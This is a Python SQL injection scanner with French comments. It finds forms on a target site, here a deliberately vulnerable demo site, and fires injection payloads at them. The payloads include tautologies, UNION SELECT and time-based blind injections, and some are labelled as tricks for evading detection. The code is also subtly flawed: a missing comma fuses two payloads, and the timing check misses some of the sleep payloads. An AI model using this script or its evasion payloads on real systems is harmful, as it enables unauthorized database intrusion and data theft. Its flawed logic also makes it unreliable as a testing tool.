import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time

TARGET_URLS = ["http://testphp.vulnweb.com"]

# Payloads SQLi classiques et time-based
SQLI_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'--'", "' UNION SELECT null, version()--",
    "' AND SLEEP(7)--", "' OR SLEEP(5)--"
    "' OR IF(1=1, SLEEP(5), 0)--",  # Bypass avec IF
    "' OR IF(1=1, BENCHMARK(1000000,MD5(1)), 0)--",  # Bypass avec BENCHMARK
    "' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END--",  # Bypass avec CASE
    "' OR CHAR(83,76,69,69,80,40,53,41)--",  # Encode "SLEEP(5)"
    "' OR CONCAT('SLE','EP(5)')--"  # Séparer SLEEP pour éviter la détection
]

def find_forms(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    forms = soup.find_all('form')
    print(f"[+] Trouvé {len(forms)} formulaire(s) sur {url}")
    return forms

def get_form_details(forms):
    form_details = []
    for form in forms:
        details = {"action": form.get("action"), "method": form.get("method", "get").lower(), "inputs": []}
        for input_tag in form.find_all("input"):
            details["inputs"].append({"name": input_tag.get("name"), "type": input_tag.get("type", "text")})
        form_details.append(details)
    return form_details

def test_sqli(url, form_details):
    print(f"\n[🔍] Test d'injection SQL sur : {url}")
    
    for payload in SQLI_PAYLOADS:
        data = {}

        for input_tag in form_details["inputs"]:
            if input_tag["type"] in ["text", "password"]:
                data[input_tag["name"]] = payload
            else:
                data[input_tag["name"]] = "test"

        action_url = urljoin(url, form_details["action"])
        method = form_details["method"]

        # Mesure le temps pour détecter une SQLi blind
        start_time = time.time()
        response = requests.post(action_url, data=data) if method == "post" else requests.get(action_url, params=data)
        elapsed_time = time.time() - start_time

        # Détection des erreurs SQL classiques
        error_signatures = ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax", "Warning: mysql"]
        if any(error in response.text for error in error_signatures):
            print(f"[🔥] Injection SQL détectée avec payload : {payload}")

        # Détection Time-Based Blind SQLi
        if "SLEEP(5)" in payload and elapsed_time > 4:
            print(f"[⏳] Injection SQL Blind détectée avec payload : {payload} (temps : {elapsed_time:.2f}s)")

def lancer_attaque_sqli():
    for url in TARGET_URLS:
        forms = find_forms(url)
        if not forms:
            print(f"[-] Aucun formulaire trouvé sur {url}")
            continue

        form_details_list = get_form_details(forms)
        for form_details in form_details_list:
            test_sqli(url, form_details)


lancer_attaque_sqli()
